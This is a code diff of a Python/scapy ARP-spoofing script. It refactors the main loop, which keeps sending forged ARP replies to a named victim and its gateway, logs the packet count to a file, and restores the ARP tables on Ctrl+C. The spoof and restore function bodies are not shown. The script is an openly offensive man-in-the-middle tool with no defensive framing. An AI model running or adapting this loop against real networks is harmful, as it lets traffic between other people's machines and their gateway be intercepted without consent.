@@ -1,4 +1,5 @@
 
+
 import sys
 sys.path.append("C:\\Users\\User\Documents\To The Distance\Python\Lib\site-packages\scapy")
 
@@ -38,28 +39,23 @@ def spoof(target_ip, spoof_ip):
 
 
 def main(gw, victim, filepath):
-    global RUN
     sent_packets = 0
 
-    if RUN:
+    while True:
         try:
-            while RUN:
-                try:
-                    spoof(victim, gw)
-                    spoof(gw, victim)
-                    sent_packets += 2
-                    with open(filepath, "w") as arp_file:
-                        arp_file.write("[+] Sent packets: " + str(sent_packets))
-                    time.sleep(1)
-                except IndexError:
-                    with open(filepath, "w") as arp_file:
-                        arp_file.write("[-] Failed .. trying again ... ")
+            spoof(victim, gw)
+            spoof(gw, victim)
+            sent_packets += 2
+            with open(filepath, "w") as arp_file:
+                arp_file.write("[+] Sent packets: " + str(sent_packets))
+            time.sleep(1)
+
+        except IndexError:
+            with open(filepath, "w") as arp_file:
+                arp_file.write("[-] Failed .. trying again ... ")
 
         except KeyboardInterrupt:
             print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
             restore(victim,gw)
             restore(gw, victim)
-    elif not RUN:
-        print("Stopped ... \n")
-        return 0
 
